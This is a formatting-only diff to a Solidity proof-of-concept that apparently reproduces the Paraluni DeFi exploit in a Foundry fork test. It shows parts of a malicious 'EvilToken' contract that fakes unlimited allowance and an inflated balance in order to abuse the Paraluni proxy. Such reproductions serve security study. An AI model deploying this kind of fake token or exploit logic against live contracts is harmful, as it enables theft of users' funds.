@@ -61,7 +61,7 @@ contract Exploit_Paraluni is TestHarness, TokenBalanceTracker {
     IUniswapV2Pair internal pancakeBSCBUSDPair = IUniswapV2Pair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
 
     function setUp() external {
-        cheat.createSelectFork(vm.envString("RPC_URL"), 16008280);
+        cheat.createSelectFork(vm.envString("RPC_URL"), 16_008_280);
 
         cheat.deal(address(this), 0);
 
@@ -158,7 +158,12 @@ contract EvilToken {
 
     address internal owner;
 
-    constructor(string memory _name, string memory, /* _symbol */ address _paraProxy) {
+    constructor(
+        string memory _name,
+        string memory,
+        /* _symbol */
+        address _paraProxy
+    ) {
         name = _name;
         symbol = symbol;
 
@@ -166,15 +171,35 @@ contract EvilToken {
         paraProxy = IParaProxy(_paraProxy);
     }
 
-    function allowance(address, /* _owner */ address /* _spender */ ) external pure returns (uint256) {
+    function allowance(
+        address,
+        /* _owner */
+        address /* _spender */
+    )
+        external
+        pure
+        returns (uint256)
+    {
         return 2 ** 256 - 1;
     }
 
-    function balanceOf(address /* account */ ) external pure returns (uint256) {
+    function balanceOf(
+        address /* account */
+    )
+        external
+        pure
+        returns (uint256)
+    {
         return 99_995_000_000_000_000_000_000;
     }
 
-    function transferFrom(address, /* from */ address, /* to */ uint256 /* amount */ )
+    function transferFrom(
+        address,
+        /* from */
+        address,
+        /* to */
+        uint256 /* amount */
+    )
         external
         returns (bool)
     {
